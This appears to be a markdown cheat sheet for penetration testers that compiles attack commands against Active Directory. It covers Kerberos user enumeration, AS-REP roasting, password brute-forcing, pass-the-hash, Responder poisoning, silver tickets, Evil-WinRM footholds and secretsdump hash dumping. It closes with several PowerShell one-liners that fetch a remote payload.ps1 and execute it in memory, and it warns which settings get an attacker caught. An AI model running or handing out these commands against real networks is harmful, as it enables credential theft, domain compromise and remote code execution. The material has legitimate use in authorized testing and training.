<pre>
               _   _             _____  _               _                   
     /\       | | (_)           |  __ \(_)             | |                  
    /  \   ___| |_ ___   _____  | |  | |_ _ __ ___  ___| |_ ___  _ __ _   _ 
   / /\ \ / __| __| \ \ / / _ \ | |  | | | '__/ _ \/ __| __/ _ \| '__| | | |
  / ____ \ (__| |_| |\ V /  __/ | |__| | | | |  __/ (__| || (_) | |  | |_| |
 /_/    \_\___|\__|_| \_/ \___| |_____/|_|_|  \___|\___|\__\___/|_|   \__, |
                                                                       __/ |
                                                                      |___/ 
               ___ _                _   __ _               _   
              / __\ |__   ___  __ _| |_/ _\ |__   ___  ___| |_ 
             / /  | '_ \ / _ \/ _` | __\ \| '_ \ / _ \/ _ \ __|
            / /___| | | |  __/ (_| | |__\ \ | | |  __/  __/ |_ 
            \____/|_| |_|\___|\__,_|\__\__/_| |_|\___|\___|\__|
                                                   
</pre>

### A compilation of tools and techniques targeting Active Directory and Domain Controlers.


## 0x00 Mind Map
[Pentesting Active Directory](https://www.xmind.net/m/5dypm8/)


## 0x01 Recon & Enumeration

##### [ARP-Scan](https://github.com/royhills/arp-scan)
Host discovery:

`arp-scan --interface=<INTERFACE> --localnet`


#### [Impacket-GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)
Get user's non-preauth AS-Rep TGT:

`getnpusers <domain_name>/<user> -dc-ip=<domain_controller_ip>`


##### [Kerbrute](https://github.com/ropnop/kerbrute)
Enumerate or validate accounts through Kerberos Pre-Authentication [aka Pre-auth Bruteforcing]:

`kerbrute userenum --dc <DOMAIN CONTROLLER> -d <DOMAIN> <WORDLIST>` 


##### [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
Brute-force with User&Pass combinations:

`crackmapexec smb <IP> -u <USER LIST> -P <PASSWORD>`

Pass-The-Hash

`crackmapexec smb <HOST/RANGE> -u <USER> -H <NTLM HASH>`


##### [gMSADumper](https://github.com/micahvandeusen/gMSADumper)
LDAP Enumeration

`python3 gMSADumper.py -u <USER> -p <PASSWORD> -d <DOMAIN>`


#### [BloodHound](https://github.com/BloodHoundAD/BloodHound)
Authenticated Domain Enumeration

`bloodhound-python -u <user> -p <pass> -ns <domain_controler_ip> -d <domain_name> -c All`
##### _Please note that this configuration shall get you caught, as it is going to send a lot of queries against the domain._


## 0x02 Exploitation

##### [Responder](https://github.com/lgandx/Responder/)

Listening for events:

`responder -I <NETWORK INTERFACE> -A`

##### [Impacket-getSTX](https://github.com/SecureAuthCorp/impacket)

Silver Ticket Attack

`python3 getST.py <DOMAIN>/<USER>$ -spn WWW/<DOMAIN CONTROLLER> -hashes :<HASH> -impersonate <USER TO IMPERSONATE>`


## 0x03 Post-Exploitation

##### [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
Get a foothold on a remote machine

`evil-winrm -i <machine_ip> -u <user> -p <pass>`


##### [KrbRelayX](https://github.com/dirkjanm/krbrelayx)

Add DNS records:

`python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' -a add -r '<RECORD.DOMAIN>' -d <YOUR IP> <MACHINE IP>`

##### [Impacket-getADUser](https://github.com/SecureAuthCorp/impacket)

Authenticated User Enumeration

`python3 GetADUsers.py -all <DOMAIN>/<USER>:<PASS> -dc-ip <IP ADDRESS>`


##### [Impacket-SecretsDump](https://github.com/SecureAuthCorp/impacket)

Dump User Hashes from Domain Controller

`python3 secretsdump.py <DOMAIN>/<USER>:<PASS>@<MACHINE>`

##### Downloading files via PowerShell
`iex (New-Object Net.WebClient).DownloadString('http://server/payload.ps1')`


`$ie=New-Object -ComObject
InternetExplorer.Application;$ie.visible=$false;$ie.navigate('http://server/payload.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response`

###### PSv3 & onwards
`iex (iwr 'http://server/payload.ps1')`


`$h=New-Object -ComObject
Msxml2.XMLHTTP;$h.open('GET','http://server/payload.ps1',$false);$h.send();iex
$h.responseText`


`$wr = [System.NET.WebRequest]::Create("http://server/payload.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()`

